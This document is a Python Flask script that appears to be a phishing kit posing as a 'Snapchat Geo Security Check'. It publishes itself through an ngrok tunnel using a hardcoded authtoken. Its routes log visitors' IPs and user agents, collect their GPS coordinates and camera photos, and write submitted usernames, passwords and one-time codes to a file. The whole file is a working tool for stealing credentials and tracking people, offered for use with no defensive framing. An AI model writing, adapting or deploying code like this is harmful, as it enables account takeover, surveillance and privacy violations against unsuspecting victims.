import os
import subprocess
import time
import requests
import threading
import sys
from datetime import datetime
from flask import Flask, request, render_template, jsonify

NGROK_AUTH_TOKEN = "2xYj1oYy7eEiF4DZi3a9iZqcYSc_7KpfhVbnc28ESPx4Qg4n8"
NGROK_PATH = "ngrok.exe" if os.path.exists("ngrok.exe") else "ngrok"
FLASK_PORT = 5000

app = Flask(__name__)
os.makedirs("captures", exist_ok=True)

def check_ngrok():
    try:
        # Try to run ngrok version to check if it exists
        subprocess.run([NGROK_PATH, "version"], check=True, capture_output=True)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("\n[!] Error: ngrok not found!")
        print("[!] Please make sure ngrok is installed and either:")
        print("    1. Place ngrok.exe in the same directory as this script")
        print("    2. Add ngrok to your system PATH")
        print("\n[!] You can download ngrok from: https://ngrok.com/download")
        return False

def print_banner():
    banner = r"""
   _____                           _             _   _                 
  / ____|                         | |           | | (_)                
 | (___   __ _  ___ ___  ___  ___ | |_ ___   ___| |_ _  ___  _ __  ___ 
  \___ \ / _` |/ __/ _ \/ __|/ _ \| __/ _ \ / __| __| |/ _ \| '_ \/ __|
  ____) | (_| | (_|  __/\__ \ (_) | || (_) | (__| |_| | (_) | | | \__ \
 |_____/ \__,_|\___\___||___/\___/ \__\___/ \___|\__|_|\___/|_| |_|___/
                                                                        
    """
    print(banner)
    print("Starting Snapchat Geo Security Check server...")
    print("Injecting ngrok authtoken...")

def add_ngrok_authtoken():
    if not check_ngrok():
        sys.exit(1)
        
    try:
        subprocess.run([NGROK_PATH, "config", "add-authtoken", NGROK_AUTH_TOKEN], check=True, capture_output=True)
        print("[+] Ngrok authtoken added.")
    except subprocess.CalledProcessError:
        print("[!] Authtoken already set or failed to apply.")

def start_ngrok(port):
    if not os.path.exists(NGROK_PATH):
        print(f"\n[!] Error: {NGROK_PATH} not found in current directory!")
        print("[!] Please place ngrok.exe in the same folder as this script.")
        return None, None

    # Kill any existing ngrok processes more thoroughly
    print("[+] Cleaning up any existing ngrok processes...")
    if os.name == 'nt':  # Windows
        os.system('taskkill /f /im ngrok.exe 2>nul')
        os.system('taskkill /f /im ngrok.exe 2>nul')  # Run twice to ensure it's killed
    else:  # Unix/Linux
        os.system('pkill -9 ngrok 2>/dev/null')
    
    time.sleep(2)  # Wait longer for process to be killed
    
    # Verify ngrok is executable
    try:
        subprocess.run([NGROK_PATH, "version"], check=True, capture_output=True)
    except Exception as e:
        print(f"[!] Error: Cannot execute ngrok: {str(e)}")
        return None, None

    # Kill any existing tunnels
    try:
        subprocess.run([NGROK_PATH, "kill"], check=True, capture_output=True)
    except:
        pass  # Ignore errors here as it might not be running

    ngrok_cmd = [NGROK_PATH, "http", str(port)]
    print(f"[+] Launching ngrok tunnel on port {port} ...")
    
    try:
        # Start ngrok with full output capture
        ngrok_proc = subprocess.Popen(
            ngrok_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        print("[+] Waiting for ngrok tunnel to initialize...")
        time.sleep(5)  # Give ngrok more time to start

        # Check if process is still running
        if ngrok_proc.poll() is not None:
            stdout, stderr = ngrok_proc.communicate()
            print(f"[!] Ngrok process failed to start!")
            print(f"[!] Error output: {stderr}")
            print("\n[!] Please try these steps:")
            print("1. Close any other ngrok windows or processes")
            print("2. Go to https://dashboard.ngrok.com/agents")
            print("3. Kill any existing sessions")
            print("4. Run this script again")
            return None, None

        public_url = None
        for attempt in range(30):
            try:
                # Try to get the tunnel info
                resp = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=5)
                if resp.status_code == 200:
                    tunnels = resp.json().get("tunnels", [])
                    for t in tunnels:
                        if t["proto"] == "https":
                            public_url = t["public_url"]
                            break
                    if public_url:
                        break
                print(f"[!] Waiting for ngrok... ({attempt+1}/30)")
            except requests.exceptions.RequestException as e:
                print(f"[!] Connection attempt {attempt+1}/30 failed: {str(e)}")
            time.sleep(1)

        if public_url:
            print(f"[+] Public ngrok URL: {public_url}")
            return ngrok_proc, public_url
        else:
            print("[!] Failed to retrieve ngrok public URL.")
            print("[!] Please check if ngrok is running properly.")
            if ngrok_proc:
                ngrok_proc.terminate()
            return None, None
            
    except Exception as e:
        print(f"[!] Error starting ngrok: {str(e)}")
        return None, None

@app.route("/")
def home():
    # Get visitor information
    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent", "Unknown")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Log visitor information
    log_entry = f"[{timestamp}] IP: {user_ip} | User-Agent: {user_agent}\n"
    with open("tracked_users.txt", "a", encoding="utf-8") as f:
        f.write(log_entry)
    
    print(f"[NEW VISITOR] IP: {user_ip}")
    return render_template("index.html")

@app.route("/log", methods=["POST"])
def log_info():
    data = request.json or {}
    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent", "Unknown")
    lat = data.get('lat', 'N/A')
    lon = data.get('lon', 'N/A')
    accuracy = data.get('accuracy', 'N/A')
    timezone = data.get('timezone', 'N/A')

    print("[NEW VISITOR]")
    print(f"IP Address : {user_ip}")
    print(f"User Agent : {user_agent}")
    print(f"Latitude   : {lat}")
    print(f"Longitude  : {lon}")
    print(f"Accuracy   : {accuracy}")
    print(f"Time Zone  : {timezone}")
    print("-" * 30)

    with open("visitor_data.txt", "a", encoding="utf-8") as f:
        f.write(f"{datetime.now()} | IP: {user_ip} | UA: {user_agent} | Lat: {lat} | Lon: {lon} | Accuracy: {accuracy} | Timezone: {timezone}\n")

    return jsonify({"status": "success"})

@app.route("/upload_photo", methods=["POST"])
def upload_photo():
    file = request.files.get("photo")
    if not file:
        return "No photo uploaded", 400
    
    original_ext = os.path.splitext(file.filename)[1].lower()
    if original_ext not in [".jpg", ".jpeg", ".png"]:
        original_ext = ".jpg"
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    save_filename = f"{timestamp}{original_ext}"
    save_path = os.path.join("captures", save_filename)
    
    file.save(save_path)
    print(f"[+] Photo saved: {save_path}")
    return jsonify({"status": "photo saved"})

@app.route("/submit", methods=["POST"])
def submit_creds():
    username = request.form.get("username", "")
    password = request.form.get("password", "")
    otp = request.form.get("otp", "")
    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent", "Unknown")

    print(f"Creds: {username}:{password} | OTP: {otp} | IP: {user_ip}")
    with open("creds.txt", "a", encoding="utf-8") as f:
        f.write(f"{datetime.now()} | {username}:{password} | OTP: {otp} | IP: {user_ip} | UA: {user_agent}\n")

    return "Verification complete."

if __name__ == "__main__":
    print_banner()
    
    if not check_ngrok():
        sys.exit(1)
        
    add_ngrok_authtoken()

    ngrok_proc, public_url = start_ngrok(FLASK_PORT)
    if not ngrok_proc:
        print("[!] Failed to start ngrok tunnel. Exiting...")
        sys.exit(1)

    flask_thread = threading.Thread(target=lambda: app.run(host="0.0.0.0", port=FLASK_PORT, debug=False, use_reloader=False), daemon=True)
    flask_thread.start()

    if public_url:
        print(f"\n[+] Open this link in your browser: {public_url}\n")
    else:
        print("\n[!] No public URL available. The server is running locally only.")
        print(f"[+] Local URL: http://localhost:{FLASK_PORT}\n")

    try:
        print("[+] Server is running. Press CTRL+C to stop.")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Shutting down server...")
    finally:
        if ngrok_proc:
            ngrok_proc.terminate()
            print("[+] Ngrok process terminated.")
